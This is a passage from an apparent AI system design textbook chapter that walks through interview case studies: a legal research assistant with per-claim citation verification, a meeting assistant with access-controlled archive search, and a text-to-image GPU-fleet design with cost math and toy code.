# Chapter 14 — AI Case Studies

[Chapter 13](../13-ai-system-design-and-genai-products/README.md) gave you the framework and the building blocks. This chapter is **practice under the clock**: four product-centric AI system design walkthroughs and one design critique (Part I), then seven model-centric generative-AI cases (Part II), each run the way a strong candidate would run it in 45 minutes. You are not expected to invent new architecture in an interview — you are expected to **recognise** which known design a question is built on, adapt it, and explain every trade-off with numbers.

**What you'll learn**

1. How to **pace** a 45-minute case: the clock, exit sentences, interviewer moves and a self-grading rubric.
2. **Legal research assistant** — retrieval-augmented generation (RAG) where a wrong citation is catastrophic.
3. **AI meeting assistant** — three latency regimes in one product, with privacy as architecture.
4. **Text-to-image at scale** — GPU-fleet economics: queues, utilisation, tiers, envelope math done live.
5. **Autonomous coding agent** — a bounded loop made safe by tests, a sandbox and pull-request review.
6. **Critiquing a design** — findings in severity order, each with a consequence and a fix, delivered as a plan.
7. A **comparison table** across all five cases.
8. **Part II — model-centric cases**, where the model choice is the design: **email sentence completion** (a tiny LM under a keystroke budget), **machine translation** (one multilingual model for 100+ languages), **image captioning** (grounded alt text), **face generation with GANs**, **high-resolution image synthesis** (latents and cascades), **personalised headshots** (per-user LoRA fine-tuning with consent) and **text-to-video** (spacetime latents and multi-GPU jobs), with a second comparison table.

Every case uses the same template: *requirements → approach (data and model) → architecture → evaluation → scaling and cost → safety → failure modes → follow-ups (Q→A)*, then *what separates levels and variations*, a **runnable toy** and a TL;DR. The classic-ML cases from the same interview family — music discovery, harmful content at platform scale, visual search — are in the ML Handbook, [Chapter 17](../../../ml/chapters/17-ml-case-studies-1/README.md) and [Chapter 18](../../../ml/chapters/18-ml-case-studies-2/README.md).

| Script | Case | What it demonstrates |
|---|---|---|
| `code/legal_citation_verifier.py` | Legal | Hybrid retrieval with rank fusion, per-claim verification, fail-closed |
| `code/meeting_pipeline.py` | Meetings | WER, map-reduce summary, sourced action items, ACL-bounded Q&A, deletion, comb load |
| `code/t2i_fleet_sim.py` | Text-to-image | Envelope math, priority queues, autoscaling lag, warm pool, dead-letter queue |
| `code/coding_agent_loop.py` | Coding agent | Bounded loop, protected tests, command allowlist, draft PR on exhaustion |
| `code/design_critic.py` | Critique | Severity-ordered findings with fixes and a sequenced plan |
| Seven more toys for §14.8–§14.14 | Part II | Listed at the start of Part II |

**How to use this chapter.** For each case, read only the question, close the book and talk through a design **out loud with a timer** before reading on. Whatever the walkthrough covers that you missed becomes your study list — interviews grade what you can *produce*, not what you recognise.

---

## 14.1 How to run a case study

### What it is
A time plan for the interview itself. Most candidates who fail don't lack knowledge — they run out of time before evaluation, failures or cost are ever spoken, and topics never mentioned give the interviewer no evidence. The minutes follow the seven steps of [§13.4](../13-ai-system-design-and-genai-products/README.md).

### How it works — the 45-minute clock

![The forty-five minute clock, phase by phase (course diagram)](img/the-clock.svg)
*Figure — The forty-five minute clock, phase by phase (course diagram)*

Each phase ends with an **exit sentence** said aloud, even if more could be said.

| Minutes | Framework steps | Phase | Say this, then move on |
|---|---|---|---|
| 0–8 | 1–2 | Frame and define success | "This is [known system]; target [metric = value], latency [X], scale [Y], cost [Z]; [W] out of scope. OK?" |
| 8–13 | 3 | Data and labels | "Ground truth is [source], lagging by [delay]; freshness [tier]." |
| 13–18 | 4 | Model | "Start with [simple thing]; move to [next] only if [evidence]." |
| 18–30 | 5 | Architecture | Done when every arrow carries three labels: how long, how much, what happens if it breaks |
| 30–38 | 6 | Loop and evaluation | "Nothing ships unless [offline metric] holds; [online metric] picks the winner." |
| 38–43 | 7 | Failures and cost | The three likeliest breakages with responses; then cost per unit × volume |
| 43–45 | — | Slack | Held for follow-ups, not spent. |

### Three techniques that protect the clock
1. **Announce the plan in minute one** — the interviewer can redirect you before you waste time.
2. **Timebox out loud** — "Two minutes on data, then back to it if you want depth."
3. **Park side topics** — acknowledge in one sentence, note it, return to scope.

### Handling the interviewer

![Five follow-up patterns, and the stance for each (course diagram)](img/follow-up-patterns.svg)
*Figure — Five follow-up patterns, and the stance for each (course diagram)*

| Interviewer move | Example | Stance |
|---|---|---|
| **Redirect** | "Skip ahead to the architecture." | Comply at once, but carry your numbers: "Then I'll assume quality bar X and budget Y." |
| **Stress test** | "10× the traffic", "the provider is down" | Failure/cost questions arriving early: give the **fallback sequence** (ordered backup behaviours), then the alarm that detects it |
| **Depth probe** | "Explain the reranker in detail." | Go two levels deep — mechanism, then trade-off ("a **cross-encoder** reads query and passage together: accurate, but too slow beyond a shortlist") — then *offer* a third |
| **Disagreement** | "I'd have fine-tuned there." | Name the deciding variable: "Changing private facts → retrieval; a stable format or behaviour gap → prompting, then fine-tuning" |
| **Silence** | — | Probably note-taking: continue with the plan, or ask whether more detail would help |

### The recognition move
Within two minutes, **name the familiar design inside the question**: "Legal research = company-document RAG where a wrong answer is career-ending"; "a coding agent = a capped agent loop whose sandbox decides which actions are possible". It gives both of you a shared map — which you must still adapt. If nothing is familiar, use the **family test** ([§13.3](../13-ai-system-design-and-genai-products/README.md)): score → funnel, content → pipeline, action → loop.

### Score yourself like an interviewer
A practice rubric — real rubrics vary by company and role.

![Five scoring dimensions: minimum bar vs strong-hire bar (course diagram)](img/rubric.svg)
*Figure — Five scoring dimensions: minimum bar vs strong-hire bar (course diagram)*

| Dimension | Pass | Strong hire |
|---|---|---|
| Problem navigation | Scopes; needs occasional nudges | Owns the timing, closes each phase aloud, parks tangents |
| Data and metrics | Names plausible metrics when asked | Volunteers targets, label delays, freshness; says where a proxy misleads |
| Architecture and trade-offs | Sound diagram of the right shape | Every connection has a budget and failure plan; rejected options named with what would flip them |
| Production maturity | Mentions monitoring once prompted | Volunteers the loop, release gates, fallbacks, failure and cost lists |
| Communication | Clear structure | Plan up front, timeboxes aloud, ends on loop, risks and price |

A dimension stuck at "pass" for two practice runs is your study list; record yourself — you won't notice your own gaps.

### Self-check
1. **Q:** What ends the architecture phase? **A:** Every arrow in the diagram has a latency, a cost posture and a failure behaviour.
2. **Q:** How do you answer "the provider is down"? **A:** Walk the fallback sequence, then name the alarm that catches it.

### TL;DR
8 / 5 / 5 / 12 / 8 / 5 / 2 minutes, an exit sentence per phase, plan in minute one, timebox aloud, park side topics, recognise the known system.

---

## 14.2 Case: legal research assistant

> **The question (paraphrased).** A legal-software vendor wants an AI research tool for law firms: answers drawn from court decisions, statutes and the firm's private files, with trustworthy citations — one made-up citation in a court filing can cost the vendor the client and the lawyer their reputation. About 50,000 lawyers will use it.

### Requirements (minutes 0–8)
**Recognition.** "This is enterprise RAG ([Chapter 7](../07-embeddings-vector-databases-and-rag/README.md)) with the strictest confidentiality and verification needs I can imagine. Claims get grounding checks *before* release; when evidence is thin, the product returns research pointers or declines. None of this replaces the attorney's own review."

**Success metrics — stakes first.**
- *Primary (positive):* **attorney-verified usefulness** — share of answers reliable enough to build on.
- *Binding (negative) metrics — these decide the launch:* **fabricated-citation rate** (bar: *none found* in the eval sample — report the sample size and an upper confidence bound, since none found ≠ none possible); **unsupported-claim rate**, per claim against retrieved text; **refusal correctness in both directions** (refusing answerable questions is also a failure).
- *Latency is the relaxable constraint* — allow up to ~30 s for a verified synthesis (validate with users) and spend it on verification deliberately. *Cost* is argued per query against billable lawyer time saved.

**Scope.** Research assistance only — no drafting filings, no "legal advice" framing; English, US law for v1. Firm documents are strictly confidential: **tenant isolation at law-firm grade**, including **ethical walls** (barriers inside one firm that stop a team seeing another matter's files, to avoid conflicts of interest).

![The primary metric is positive; the binding metrics are negative (course diagram)](img/legal-metrics.svg)
*Figure — The primary metric is positive; the binding metrics are negative (course diagram)*

### Approach: data and model (minutes 8–18)
**Legal text is highly structured, and plain RAG throws that structure away** — exploiting it is where this case gets deep.
- Case law is a **citation graph**: each decision is a node, each citation an edge to an earlier authority; later cases can affirm, distinguish or overrule earlier ones.
- Law has a **validity dimension**: each chunk carries jurisdiction, court, decision date and **treatment status** (good law, amended, superseded, overruled — how later rulings handled it). Treatment can apply to part of a case, and other jurisdictions can still be persuasive, so metadata *flags*; it doesn't decide.
- **Chunk along the law's own structure**: judgments by section, statutes by clause, each tagged with its citation.

![Citation relationships and treatment metadata support legal review (course diagram)](img/legal-citation-graph.svg)
*Figure — Citation relationships and treatment metadata support legal review (course diagram)*

**Retrieval.** Questions mix exact identifiers (statute numbers, party names → **BM25** keyword ranking) with fuzzy concepts (→ embeddings), so run **hybrid retrieval**, fuse, then **rerank hard** with a cross-encoder — the latency budget pays for top precision ([§7.7](../07-embeddings-vector-databases-and-rag/README.md)). Extract jurisdictions from the question (ask when ambiguous) and filter by them, keeping relevant cross-jurisdiction authority visible.

**Model posture.** Choose the generator on domain evals; low temperature reduces variation but doesn't make answers true. Sources do the knowing, the model does the synthesis. Fine-tuning may help format but **cannot replace retrieval of current authority** — weights can't be checked for whether a case is still good law (the check lawyers call "Shepardizing").

### Architecture (minutes 18–30)

```mermaid
flowchart LR
    Q["Attorney question"] --> QP["Query processing - extract jurisdictions, clarify"]
    QP --> HR["Hybrid retrieval - BM25 plus vectors, metadata filters, tenant and ethical-wall ACLs"]
    HR --> RR["Cross-encoder rerank"]
    RR --> GEN["Draft answer - every claim carries citation plus quoted passage"]
    GEN --> V1{"Citation resolves in corpus?"}
    V1 -- "no" --> STRIP["Strip claim"]
    V1 -- "yes" --> V2{"Quote matches source and passage supports claim?"}
    V2 -- "no" --> STRIP
    V2 -- "yes" --> V3{"Treatment still good law?"}
    V3 -- "no" --> STRIP
    V3 -- "yes" --> OUT["Verified answer with pinpoint quotes"]
    STRIP --> RECHECK["Re-check remaining answer - or research pointers"]
    RECHECK --> OUT
```

- **Every statement carries a page-level citation plus the supporting quote**, so it is quick to check.
- **Synchronous verification on every answer**, not a sample: per-claim **entailment checks** (does the passage support the statement? — the checker itself is evaluated against attorney labels), exact-match checks that the cited document exists and contains the quote, and a fresh treatment look-up.
- **Structural prevention:** a citation that doesn't resolve to a real document *cannot be rendered* — a deterministic rule, not a request to the model.
- A failing claim is regenerated, removed or replaced by research pointers; then **re-check what remains**, since removing a claim can leave a misleading conclusion. A list of the closest authorities is still useful — **refusal as a product**.

![Required checks run before release; attorney review remains necessary (course diagram)](img/legal-checks.svg)
*Figure — Required checks run before release; attorney review remains necessary (course diagram)*

### Evaluation and the loop (minutes 30–38)
- Lawyer feedback is slow and partial — also pay for independent expert audits, and keep firm-confidential content out of shared datasets.
- **Every citation a user flags becomes a permanent regression test.**
- **Component evals**: the reranker is scored on attorney-labelled relevance with **NDCG** (a ranking metric that rewards the best passages at the very top) and gated like any model change.
- New decisions and treatment changes arrive under **freshness SLOs in hours** — citing a ruling overturned days ago is exactly what a judge notices.

### Scaling and cost
- 50,000 attorneys × (say) 10 queries/day = 500,000 queries/day ≈ 6/s average — modest QPS; the cost is per-query depth (retrieval + rerank + generation + verification).
- Treat ~$3/query as an illustrative budget and itemise it. Licence fees for case law and treatment data may be the biggest line — and the moat competitors can't easily copy.

### Safety and privacy
- Isolation at **three layers**: retrieval (per-tenant filters and ethical walls), training (firm documents never train a model other firms use), caches (per tenant); plus contractual **zero-retention inference** (verify terms per endpoint).
- Retrieved text is untrusted for instructions ([§12.4](../12-safety-ethics-governance/README.md)).

### Failure modes
| Failure | Response |
|---|---|
| Verification service down | **Fail closed**: refuse to serve unverified synthesis; research pointers only |
| Treatment data stale | Show its as-of time; limit conclusions that depend on current status |
| Retrieval degraded | Research-pointer mode: citations without synthesis |
| A fabricated citation reaches an attorney anyway | Incident process below |

### Follow-ups (Q→A)
- **Q: "A lawyer still finds an invented citation."** A: Ask first: *was the citation in the retrieved context?* — that separates "the generator invented it" from "the verifier missed it". The existence check is **deterministic**, so a miss means a bypass, bad source mapping, stale metadata or a verifier bug. Fix it, add the case to the regression suite, notify affected users.
- **Q: "Why not fine-tune on all the case law instead?"** A: Knowledge vs behaviour — and law changes; a retrieval layer can carry treatment status, frozen weights can't be checked ([§8.1](../08-prompting-vs-finetuning-vs-rag-and-llm-evaluation/README.md)).
- **Q: "A partner wants 5 seconds, not 30."** A: Change the *artefact*, not the checks: a fast mode returns checked research pointers and quotes; the verified synthesis follows asynchronously. Sell speed as a tier; never buy it by weakening verification.
- **Q: "A firm demands on-prem."** A: Licensed feeds (redistribution rights), the shared eval loop (per-tenant evals) and operations (versioned index and model artefacts) break; the architecture survives, the learning loop fragments.
- **Q: "California law, Delaware company."** A: Extract both jurisdictions, retrieve per jurisdiction, answer comparatively with per-claim citations, surface conflicts.

### What separates levels, and variations
Mid-level builds correct RAG with citations and adds verification when pushed; senior leads with the negative metrics and trades latency for verification out loud; staff separates *enforceable* checks (a citation must resolve to render) from *probabilistic* ones (relevance, support, treatment) that need evaluation, and names licensing as both cost and moat. **Variations:** a *medical literature assistant* (validity metadata = retractions and superseded guidelines; "jurisdiction" = patient context) and a *financial-compliance assistant* (rules cross-reference like case law; the audit trail is the product).

### Toy: per-claim verification (`code/legal_citation_verifier.py`)
Retrieval filters by jurisdiction, ranks with a small **BM25** and a toy semantic score, and fuses them with **reciprocal rank fusion** — score(d) = Σ 1/(k + rankᵢ(d)), k = 60 — which needs only ranks, not comparable scores. A scripted "LLM" drafts five claims with typical errors; the verifier checks each.

```python
def verify(claim, ctx, available=True):
    if not available:
        raise RuntimeError("verification service unavailable")      # -> fail closed
    auth = next((a for a in CORPUS if a.cite == claim.cite), None)
    if auth is None:
        return False, "citation does not resolve in corpus (cannot render)"
    if auth not in ctx:                                             # the debugging-matrix question
        return False, f"not in retrieved context (drafted from model memory; {auth.treatment})"
    if claim.quote.lower() not in auth.passage.lower():
        return False, "quoted text not found in cited source"
    support = len(set(toks(claim.text)) & set(toks(claim.quote))) / max(1, len(set(toks(claim.text))))
    if support < 0.4:                                               # stand-in for an entailment model
        return False, f"entailment proxy too weak ({support:.2f})"
    if auth.treatment == "overruled":
        return False, "authority has been overruled (treatment re-check)"
    return True, f"verified (support {support:.2f}, {auth.treatment})"
```

Output:
```
jurisdictions extracted: US-CA, US-DE
retrieved: ['Hale v. Northwind Foods', 'Marsh v. Delta Freight', 'Avery v. Brook Logistics']
  KEEP  Hale v. Northwind Foods      verified (support 0.88, good law)
  STRIP Ortiz v. Pell Mfg.           not in retrieved context (drafted from model memory; overruled)
  STRIP Reyes v. Summit Bank         citation does not resolve in corpus (cannot render)
  STRIP Marsh v. Delta Freight       quoted text not found in cited source
  KEEP  Avery v. Brook Logistics     verified (support 0.60, good law)

verified answer (each claim carries a pinpoint quote):
  * In California, constructive discharge requires aggravated or continuous intolerable conditions.
      [Hale v. Northwind Foods, 88 Cal.App.4th 55 (2001)] "a constructive discharge claim requires aggravated or continuous intolerable conditions"
  * The federal standard asks whether a reasonable person would feel compelled to resign.
      [Avery v. Brook Logistics, 212 F.3d 101 (2d Cir. 2004)] "a reasonable person would feel compelled to resign"
  research pointer (no verified claim): Marsh v. Delta Freight, 640 A.2d 12 (Del. 1996) [good law]
  (claims were removed: re-read what remains so it cannot mislead)

--- same query while the verification service is down ---
retrieved: ['Hale v. Northwind Foods', 'Marsh v. Delta Freight', 'Avery v. Brook Logistics']
FAIL CLOSED: verification service unavailable -> research pointers only:
   - Hale v. Northwind Foods, 88 Cal.App.4th 55 (2001) [good law]
   ... (the other two authorities, as pointers)
```
(All cases are fictional.) The invented case never renders; the overruled one is caught because it wasn't retrieved — the model "remembered" it; the misquote fails the exact-text check, so the Delaware question degrades to a research pointer. With the verifier down, the product fails closed.

### TL;DR
Enterprise RAG with maximum stakes: negative metrics bind the launch, latency is spent on synchronous per-claim verification, legal metadata (jurisdiction, treatment) shapes retrieval, unresolvable citations cannot render, refusal is a product, and everything fails closed.

---

## 14.3 Case: AI meeting assistant

> **The question (paraphrased).** Build a meeting assistant for businesses: it sits in video calls, produces a transcript, writes a recap with to-dos, and afterwards answers questions over the whole history of a team's meetings. Scale: 100,000 customer companies and about 5 million meetings per week.

### Requirements (minutes 0–8)
**Recognition.** "Three subsystems with three latency regimes and one shared data path: a **real-time lane** (speech-to-text while people talk), an **async generation pipeline** (recaps and to-dos after the call — the job-queue pattern), and **RAG over the meeting archive**." That hands the interviewer a map with three regions to choose from.

![Three latency regimes, one shared data path (course diagram)](img/meeting-three-regimes.svg)
*Figure — Three latency regimes, one shared data path (course diagram)*

**Success — one set per subsystem.**
| Subsystem | Metric |
|---|---|
| Live transcription | **Word error rate (WER)** = (substitutions + deletions + insertions) ÷ words in the reference transcript — can exceed 100%; plus **speaker-attribution accuracy** |
| Summaries and action items | Model-assisted and human review; **edit rate** (useful but noisy). Wrong-owner action items are the most visible failure |
| Archive Q&A | Retrieval recall and **faithfulness** (answers supported by transcripts) |

**Privacy is a first-class requirement** — it shapes the design, not an appendix. **Scope:** post-call output and archive search; live translation and coaching are named and parked. **Consent** (recording notices, per-jurisdiction recording laws) is a hard product gate.

**Scale.** 5M meetings/week ≈ 714K/day. At ~1 hour average and ~10–20K tokens per hour of speech, that's roughly 7–14 billion transcript tokens/day into the summary pipeline.

### Approach: the data path (minutes 8–18)
**During the call.** Audio streams to **streaming ASR** (automatic speech recognition) with **speaker diarization** (who spoke when) — name them, don't design their internals ([§10.6](../10-generative-models-beyond-text/README.md)). Partial transcripts land in a live store; small specialised models run regionally near the audio.

**After the call — a workflow, not an agent.** Every step is known in advance, so a fixed pipeline wins on cost, latency, debuggability and evaluability:
1. Clean and segment the transcript by topic.
2. Summarise with **map-reduce**: summarise each segment independently (*map*), then combine the summaries in one final pass (*reduce*) — context-budget management for long meetings.
3. Extract **to-dos** as records — who, by when, and the **exact words** that created them, linked to that transcript moment; an unsupported owner or date stays *unknown* pending confirmation.
4. Deliver only to recipients the meeting's sharing policy authorises.

**Into the archive.** Chunk by topic; tag each chunk with meeting, date, team, transcript version and **who may see it**. **ACLs** (access control lists) start from verified attendees and explicit shares under tenant policy, with explicit rules for guests and revoked access. Every read path — search, recaps, to-dos, downloads, emails — checks *current* permissions.

### Architecture (minutes 18–30)

```mermaid
flowchart LR
    A["Call audio"] --> ASR["Streaming ASR plus diarization - regional, milliseconds"]
    ASR --> LIVE[("Live transcript store")]
    LIVE -- "call ends" --> Q[["Job queue - absorbs top-of-hour burst"]]
    Q --> WF["Post-call workflow - segment, map-reduce summary, action items with source quotes"]
    WF --> ART[("Versioned artefacts - summaries, action items")]
    WF --> IDX[("Archive index - chunks plus ACL metadata")]
    ART --> DEL["Delivery - re-check recipient access, prefer access-controlled links"]
    U["User question"] --> QA["Archive Q&A - ACL filter then retrieve then answer with meeting-moment citations"]
    IDX --> QA
```

- **Comb-shaped load.** Meetings end on the hour, so completions spike at the top of every hour, then lull — like a comb's teeth. That picture justifies the queue: work is absorbed and processed within a promised window ("summary within 10 minutes").

![Comb-shaped load: meetings end on the hour (course diagram)](img/meeting-comb-load.svg)
*Figure — Comb-shaped load: meetings end on the hour (course diagram)*

- **Summaries are versioned per-meeting artefacts** (artefact caching, not answer caching).
- **Archive answers link to the exact moment** in the recording — [Chapter 7](../07-embeddings-vector-databases-and-rag/README.md)'s citation pattern with a product-native anchor.
- **Cost routes by lane**: transcription is the volume cost; summaries use small-to-mid models; low-volume archive Q&A can use a frontier model.

![Apply meeting access policy to retrieval, delivery, and generated answers (course diagram)](img/meeting-acl.svg)
*Figure — Apply meeting access policy to retrieval, delivery, and generated answers (course diagram)*

### Evaluation and the loop (minutes 30–38)
- Summary edits and action-item reassignments are behavioural feedback; where consent and tenant policy allow, curated original→edited pairs can adapt a small summariser (eval data kept separate, tenant content never pooled without authorisation).
- Q&A feedback grows the golden set; WER and speaker attribution are tracked per language and accent group.

### Scaling and cost
Price speech-to-text, storage, generation and retrieval separately; **speech-to-text is often the largest line**. Levers: a cheaper or self-run recogniser for the biggest languages, skipping silence, and re-transcribing the archive later with a slower, more accurate model.

### Safety and privacy
- ACLs bound search, delivery *and* synthesis — and the answer says so: "committed in meetings **you have access to**".
- **Deletion = tombstone and propagate**: mark the meeting dead everywhere reads check, then purge every downstream copy — transcripts, indexes, caches, summaries, action items (derived data is the classic miss). A **legal hold** means preserve, not delete.
- Re-check recipients at delivery time; prefer access-controlled links — an emailed copy can't be revoked.

### Failure modes
| Failure | Response |
|---|---|
| ASR struggles with accents or crosstalk | Confidence-scored transcripts; low-confidence spans marked in summaries, not guessed |
| Pipeline backlog | Status and a revised ETA; queue-depth alarms |
| Deletion request / 90-day retention | Tombstone-and-propagate as a monitored pipeline with its own SLO; holds pinned per meeting |
| Permission change after delivery | Access-controlled links; delivery-time checks |

### Follow-ups (Q→A)
- **Q: "The CEO wants every promise engineering made to marketing this quarter."** A: Aggregation RAG across meetings under the asker's ACLs, with per-claim meeting citations and a UI caveat: "in meetings you can access". The privacy model shapes *truthfulness* — the decisive promise may sit in a meeting the CEO never joined.
- **Q: "A call includes two customer companies. Who owns it?"** A: Define ownership, consent, sharing and retention first; then each tenant gets its own authorised copy (copy semantics).
- **Q: "Why not one agent for the post-call flow?"** A: The steps are enumerable, so a workflow is cheaper, faster and testable; an agent may fit later in the archive assistant, where the path depends on what is found.
- **Q: "Live translation is now required."** A: A new streaming model in the real-time lane; the async pipeline is untouched — because the regimes were separated from day one.
- **Q: "Users can't find decisions."** A: Decisions are statements, not topics: extract decisions and commitments as records at ingest, index them, cite their transcript moments.

### What separates levels, and variations
Mid-level wires transcription → summary → search linearly with permissions as a checkbox; senior opens with the three regimes, justifies the queue with the comb and applies ACLs to search *and* delivery; staff shows privacy shaping truthfulness (the CEO caveat) and names ASR as the real bill. **Variations:** *real-time sales coaching* (the live lane is the whole product; the true label — deal outcome — arrives months later) and a *lecture assistant* (the archive is the product; consent may involve minors).

### Toy: the post-call pipeline (`code/meeting_pipeline.py`)
```python
def map_summarise(seg):                              # MAP: keep decisions/commitments per segment
    key = re.compile(r"\b(agreed|commits?|decided|needs?)\b", re.I)
    keep = [u for u in seg if key.search(u.text)] or seg[:1]
    return " ".join(u.text + (" [low-confidence audio - verify]" if u.conf < 0.8 else "")
                    + f" ({u.ts})" for u in keep)
def can_read(user, m):                               # ACL applied BEFORE retrieval scoring
    return not m.deleted and (user in m.attendees or user in m.extra_viewers)
```
Output:
```
1) WER
    WER=0.00  <- 'engineering commits to shipping the beta by friday'
    WER=0.25  <- 'engineering commit to shipping beta by friday'
    WER=0.62  <- 'uh engineering um commits to uh shipping the the beta by friday okay'
    WER can exceed 1: 4.00

2) Post-call workflow for Launch sync
  - Engineering commits to shipping the beta to marketing by Friday. (01:05) Marketing needs final screenshots two days before the campaign. (02:30)
  - We agreed premium stays at twelve dollars for launch. [low-confidence audio - verify] (05:40)
    ACTION owner=tom, task='update the pricing page', due=Wednesday
           source m1@06:15: "Tom will update the pricing page by Wednesday."
    ACTION owner=UNCONFIRMED (sam not an attendee), task='draft the press release', due=Monday
           source m1@07:02: "Sam will draft the press release by Monday."

3) Archive Q&A with access control
[tom] what did engineering commit to marketing
    - Engineering commits to shipping the beta to marketing by Friday.  <Launch sync, m1@01:05>
    (answer covers only meetings you can access)
[priya] what did engineering commit to marketing
    - Engineering commits to shipping the beta to marketing by Friday.  <Launch sync, m1@01:05>
    - Engineering commits to a security audit before the deal closes.  <Legal review, m2@03:10>
    (answer covers only meetings you can access)

4) Delete meeting m1 (approved, no legal hold)
    purge transcript    removed
    ... (vector index, summary cache, action items removed; email digests: nothing to remove)
[priya] what did engineering commit to marketing
    - Engineering commits to a security audit before the deal closes.  <Legal review, m2@03:10>
    (answer covers only meetings you can access)

5) Comb-shaped load (5,000 meetings/hour in one region)
    average need: 5,000 x 1.5 min / 60 min = 125 busy workers
    arrivals in minutes 0-2 after the hour: 3599 of 5000; busiest minute: 1238
    150 workers x 1.5 min/job: p50 wait 14.2 min, max wait 33.0 min, all done within 10-min SLO: False
    700 workers x 1.5 min/job: p50 wait 1.5 min, max wait 5.5 min, all done within 10-min SLO: True
```
Read the results: filler words raise WER (insertions count), and a one-word reference transcribed as five words scores 400%. The low-confidence pricing decision is flagged, not stated as fact; "Sam" isn't an attendee, so the owner stays unconfirmed. Tom and Priya get different answers to the same question — each bounded by their access (the CEO caveat). Deletion purges every derived store. Sizing workers for the *average* (125) breaks the 10-minute promise at the top of the hour; keeping it needs ~5.6× that (700) — or a looser promise, or capacity pre-warmed for the comb.

### TL;DR
One data path, three speeds: streaming speech-to-text, a queued recap *workflow*, and RAG over the archive. ACLs from meeting policy bound retrieval, delivery and synthesis; every item links to its transcript moment; deletion propagates to derived data; ASR is the bill to watch.

---

## 14.4 Case: text-to-image product at scale

> **The question (paraphrased).** A consumer app turns a text prompt into a grid of four pictures, with free and paying users. Volume is ~2M images per day and rising. Design it — the interviewer adds that spend is their main worry.

### Requirements (minutes 0–8)
**Recognition.** "Generation takes seconds and clients disconnect, so this is an asynchronous job pipeline — and since the bill is the worry, I'll estimate GPU capacity and cost *first*."

**Success — three numbers, said together.**
1. **Images kept per session** — selections and upscales, not generations.
2. **Wait time by tier** — the promise the queue makes.
3. **Safety incident rate** — a generated image can be shared instantly.

**Latency, in one careful sentence.** Of the several clocks (acceptance, queue wait, generation, completion) you commit to a *wait-time distribution per tier* — paid users within seconds at p90, free users about a minute — and display it. **Scope:** new images and variations; editing, inpainting and video are out (their costs behave differently).

### Approach: data and model (minutes 8–18)
- **Input is one line of text** — too little for a good image. An optional **prompt enhancer** adds detail while preserving intent; moderate the enhanced text too.
- **Output is a rich job record**: prompt, enhanced prompt, model version, **seed** (sets the random starting noise), settings, software versions, both safety-gate scores. (A seed alone doesn't guarantee identical reproduction.)
- **The four-image grid is a preference signal** — which image is picked, upscaled or regenerated. Noisy (position matters), but with permission it drives the loop.
- **Model, at name level.** A text encoder guides a **diffusion model** that starts from noise and cleans it over N **denoising steps**, so cost ≈ steps × resolution ([§10.5](../10-generative-models-beyond-text/README.md)).
- **A portfolio, not a model**: a flagship model (paid quality), a fast low-step model (previews, free tier), an **upscaler** (only on picked images) and the enhancer. Model and settings are chosen **when the job is queued**, by plan — steps and resolution belong to the job, which is the basis of pricing.

### Architecture (minutes 18–30)
**Do the math before defending any box** (all rates illustrative):

![Illustrative capacity math: distinguish busy GPU equivalents from provisioned fleet cost (course diagram)](img/t2i-capacity-math.svg)
*Figure — Illustrative capacity math: distinguish busy GPU equivalents from provisioned fleet cost (course diagram)*

| Step | Arithmetic |
|---|---|
| Rate | 2,000,000 ÷ 86,400 s ≈ **23.1 images/s** (average; peaks are higher) |
| Busy GPUs | 23.1 × 10 GPU-s ≈ **231 GPUs busy at every moment** on average |
| Fully utilised cost | 231 × $4/h × 24 ≈ **$22,200/day** |
| Realistic fleet | 500 GPUs provisioned for peaks, 24h: **$24K–$48K/day** at $2–$4 per GPU-hour |

Every box you draw must now justify itself against that figure.

```mermaid
flowchart LR
    C["Client"] --> API["API - validate, prompt gate, enhance, idempotency key"]
    API -- "blocked" --> REJ["Reject before any GPU is spent"]
    API --> PQ[["Priority queues - paid, free, batch"]]
    PQ --> SCH["Scheduler - batch by model and resolution"]
    SCH --> W["Warm GPU workers - weights resident in memory"]
    W --> IG{"Image gate"}
    IG -- "fail" --> HOLD["Discard, log, learn"]
    IG -- "pass" --> OS[("Object storage plus CDN - provenance attached")]
    W -. "crashes twice" .-> DLQ[["Dead-letter queue - page a human"]]
    PQ -. "queue depth and age" .-> AS["Autoscaler - trend based, warm pool"]
    AS -.-> W
    C <-. "progress via WebSocket or polling" .-> API
```

- **The queues are the business model.** Paid users jump ahead onto reserved GPUs; free users absorb backlog by waiting; a **batch** option sells night-time idle capacity at a discount. The same queues define **what each plan buys**, tell the **autoscaler** when to grow and drive the **wait estimate** users see.

![One queue doing three jobs at once (course diagram)](img/t2i-queue-three-jobs.svg)
*Figure — One queue doing three jobs at once (course diagram)*

- **The scheduler is where utilisation happens.** Loading a model takes tens of seconds, so long-lived workers keep weights on the GPU and the scheduler batches jobs with the same model and resolution. Scale on **queue-depth trends** plus measured start-up time, with a **warm pool** — cold GPUs arrive minutes late.
- **Utilisation is the business metric**: an idle GPU-second costs exactly what a busy one does.
- **Two safety gates, in order**: the prompt gate *before* generation (no GPU spent on blocked jobs); the image gate on the finished image *before* any user or CDN access. Both **fail closed**.
- **Progress events keep the wait honest** (queued → generating → done over WebSocket or polling).
- **Dead-letter queue (DLQ)**: a job that crashes a worker retries on a fresh one under the same **idempotency key** (so it is published and billed once); a second crash parks it and pages an engineer. One bad prompt never consumes the fleet.

### Evaluation and the loop (minutes 30–38)
- Per model version, track how often images are **chosen, upscaled or re-rolled** (tunes the enhancer, settles A/B tests); **human raters** calibrate what "looks good" means ([§10.9](../10-generative-models-beyond-text/README.md)).
- Every gate miss and **red-team** find (people attacking your own system on purpose) joins both gates' eval sets; thresholds are scored on missed violations *and* wrongful blocks.
- The business dashboard: queue depth per tier, utilisation, **promised vs actual wait**.

### Scaling and cost
Cost controls have different effects — choose by the user promise:

![Cost controls have different latency, quality, and capacity trade-offs (course diagram)](img/t2i-cost-controls.svg)
*Figure — Cost controls have different latency, quality, and capacity trade-offs (course diagram)*

| Lever | Saves | Costs |
|---|---|---|
| Batching | GPU time per image | Memory, possible added wait |
| Warm pool sized to trends | Spike latency | Idle GPUs bought on purpose |
| Quality settings (fewer steps, lower resolution) | GPU-seconds per image | Quality — only under a stated policy, never silently for paid users |
| Longer free-tier waits / admission caps | Peak capacity | User experience |
| Off-peak batch tier | Turns idle capacity into revenue | No wait promise |

Other lines: storage, networking, moderation, operations.

### Safety
Prompt gate (classifiers, adversarial-phrasing detection), image gate (NSFW, violence, real-person likeness, minors), **provenance** (watermarks and C2PA content credentials — establish origin, not safety, and can be stripped). Copyright and likeness rules vary by jurisdiction: legal review ([§12.10](../12-safety-ethics-governance/README.md)).

### Failure modes
| Failure | Response |
|---|---|
| Worker dies | Job retried by idempotency key — not a lost image |
| Poison prompt | Second crash → dead-letter queue, user credited, engineer paged |
| Moderation outage | That lane stops; never fail open |
